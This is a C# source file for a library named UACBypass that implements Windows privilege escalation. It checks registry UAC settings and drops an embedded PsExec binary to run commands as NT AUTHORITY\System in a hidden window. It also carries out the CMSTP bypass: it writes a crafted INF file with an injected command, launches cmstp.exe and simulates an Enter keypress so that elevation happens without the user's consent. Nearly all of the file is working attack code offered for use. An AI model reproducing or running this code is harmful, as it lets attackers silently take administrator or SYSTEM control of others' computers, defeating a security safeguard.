using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace UACBypass
{
    public static class UAC
    {

        /// <summary>
        /// This method checks if Windows UAC can be bypassed.
        /// </summary>
        /// <returns>
        /// Return True if the current configuration of the User Account Control (UAC) allows a privilege escalation.
        /// </returns>
        public static bool canBypassUAC()
        {
            string consentPromptBehaviorAdmin = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").GetValue("ConsentPromptBehaviorAdmin").ToString();
            string enableLUA = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").GetValue("EnableLUA").ToString();
            string promptOnSecureDesktop = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").GetValue("PromptOnSecureDesktop").ToString();

            if (enableLUA != "1") return false;

            if (consentPromptBehaviorAdmin == "2") return false;
            else return true;
        }
    }

    public static class systemPrivBypass
    {
        /// <summary>
        /// Start a process as NT AUTHORITY\System user. 
        /// This system user has all the highest rights and privileges in a Windows Operating System.
        /// This method requires that the application is already running as Administrator to complete privileges escalation.
        /// </summary>
        /// <exception cref="AdminPrivilegesException">Thrown if the application is not running as
        /// Administrator.</exception>
        /// <exception cref="FileNotFoundException">Thrown if the specified file cannot be found.</exception>
        public static void startAsNTAuthoritySystem(string CommandToExecute)
        {
            if(!Win32.IsRunAsAdmin())
            {
                throw new AdminPrivilegesException("This function requires that the application is running as administrator.");
            }

            if (!Win32.ExistsOnPath(CommandToExecute)) throw new FileNotFoundException("The system cannot find the specified file.");

            //write the psexec binary into the TEMP path.
            if (Environment.Is64BitOperatingSystem) File.WriteAllBytes(Path.GetTempPath() + "\\psexec.exe", Properties.Resources.psexec64);
            else File.WriteAllBytes(Path.GetTempPath() + "\\psexec.exe", Properties.Resources.psexec);

            //start the psexec tool to make a system privilege escalation.
            using (Process p = new Process())
            {
                p.StartInfo.FileName = Path.GetTempPath() + "\\psexec.exe";
                p.StartInfo.Arguments = "-s -i " + CommandToExecute + " -accepteula";
                p.StartInfo.UseShellExecute = true;
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.StartInfo.Verb = "runas";

                p.Start();

                p.WaitForExit();
            }

            //kill all psexec proccesses, otherwise the next privilege escalation may fails.
            foreach (Process p in Process.GetProcessesByName("psexec")) { p.Kill(); }

            //delete psexec file.
            if (File.Exists(Path.GetTempPath() + "\\psexec.exe"))
                File.Delete(Path.GetTempPath() + "\\psexec.exe");
        }
    }

    
    public static class CMSTPBypass
    {
        // Our .INF file data!
        public static string InfData = @"[version]
        Signature=$chicago$
        AdvancedINF=2.5

        [DefaultInstall]
        CustomDestination=CustInstDestSectionAllUsers
        RunPreSetupCommands=RunPreSetupCommandsSection

        [RunPreSetupCommandsSection]
        ; Commands Here will be run Before Setup Begins to install
        REPLACE_COMMAND_LINE
        taskkill /F /IM cmstp.exe 

        [CustInstDestSectionAllUsers]
        49000,49001=AllUSer_LDIDSection, 7

        [AllUSer_LDIDSection]
        ""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"

        [Strings]
        ServiceName=""CorpVPN""
        ShortSvcName=""CorpVPN""

        ";

        [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);

        public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";

        /// <summary>
        /// This method generates a random named .inf file with command to be executed with UAC privileges.
        /// </summary>
        /// <returns>
        /// Return a string that represents the generated .inf file.
        /// </returns>
        public static string SetInfFile(string CommandToExecute)
        {
            string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
            string TemporaryDir = "C:\\windows\\temp";
            StringBuilder OutputFile = new StringBuilder();
            OutputFile.Append(TemporaryDir);
            OutputFile.Append("\\");
            OutputFile.Append(RandomFileName);
            OutputFile.Append(".inf");
            StringBuilder newInfData = new StringBuilder(InfData);
            newInfData.Replace("REPLACE_COMMAND_LINE", CommandToExecute);
            File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
            return OutputFile.ToString();
        }

        /// <summary>
        /// This method use CMSTP security vulnerability to make a privilege escalation without UAC prompting to the user for his consent.
        /// This method works only if the user is a member of Administrators group. Otherwise, the privilege escalation fails and UAC prompt for administrator password.
        /// CMSTP is a binary which is associated with the Microsoft Connection Manager Profile Installer. It accepts INF files which can be weaponised with malicious commands in order to execute arbitrary code in the form of scriptlets (SCT) and DLL. It is a trusted Microsoft binary which is located in the following two Windows directories.
        /// </summary>
        /// <returns>
        /// Returns True if the privilege escalation has been successful.
        /// </returns>
        /// <exception cref="BinaryNotFoundException">Thrown if the CMSTP binary cannot be found in the System32 directory.</exception>
        /// /// <exception cref="AdminPrivilegesException">Thrown if the application is already running as
        /// Administrator.</exception>
        /// <exception cref="InvalidUACConfigurationException">Thrown if the current configuration of the User Account Control (UAC)
        /// is not supported by this method.</exception>
        /// <exception cref="FileNotFoundException">Thrown if the specified file cannot be found.</exception>
        public static bool autoElevate(string CommandToExecute)
        {
            if (!File.Exists(BinaryPath))
            {
                throw new BinaryNotFoundException("Could not find cmstp.exe binary.");
            }

            if(Win32.IsRunAsAdmin()) throw new AdminPrivilegesException("The application is already running as Administrator.");

            if (!UAC.canBypassUAC()) throw new InvalidUACConfigurationException("This method doesn't support the current configuration of the User Account Control (UAC).");

            if (!Win32.ExistsOnPath(CommandToExecute)) throw new FileNotFoundException("The system cannot find the specified file.");

            //generate the .inf file.
            StringBuilder InfFile = new StringBuilder();
            InfFile.Append(SetInfFile(CommandToExecute));

            //start the cmstp exploit.
            ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
            startInfo.Arguments = "/au " + InfFile.ToString();
            startInfo.UseShellExecute = false;
            Process.Start(startInfo);

            //automatically press enter when the cmstp prompting user confirmation.
            IntPtr windowHandle = new IntPtr();
            windowHandle = IntPtr.Zero;
            do
            {
                windowHandle = SetWindowActive("cmstp");
            } while (windowHandle == IntPtr.Zero);

            System.Windows.Forms.SendKeys.SendWait("{ENTER}");

            //kill all cmstp proccesses, otherwise the next privilege escalation may fails.
            foreach (Process p in Process.GetProcessesByName("cmstp")) { p.Kill(); }

            return true;
        }

        /// <summary>
        /// This method allows the user to get a Window Handle from a given process name.
        /// </summary>
        /// <returns>
        /// Returns Int Pointer that represents the active Window Handle.
        /// </returns>
        public static IntPtr SetWindowActive(string ProcessName)
        {
            Process[] target = Process.GetProcessesByName(ProcessName);
            if (target.Length == 0) return IntPtr.Zero;
            target[0].Refresh();
            IntPtr WindowHandle = new IntPtr();
            WindowHandle = target[0].MainWindowHandle;
            if (WindowHandle == IntPtr.Zero) return IntPtr.Zero;
            SetForegroundWindow(WindowHandle);
            ShowWindow(WindowHandle, 5);
            return WindowHandle;
        }
    }

    public class InvalidUACConfigurationException : Exception
    {
        public InvalidUACConfigurationException(string message)
           : base(message)
        {
        }
    }

    public class AdminPrivilegesException : Exception
    {
        public AdminPrivilegesException(string message)
           : base(message)
        {
        }
    }

    public class AlreadyElevatedException : Exception
    {
        public AlreadyElevatedException(string message)
           : base(message)
        {
        }
    }

    public class BinaryNotFoundException : Exception
    {
        public BinaryNotFoundException(string message)
           : base(message)
        {
        }
    }
}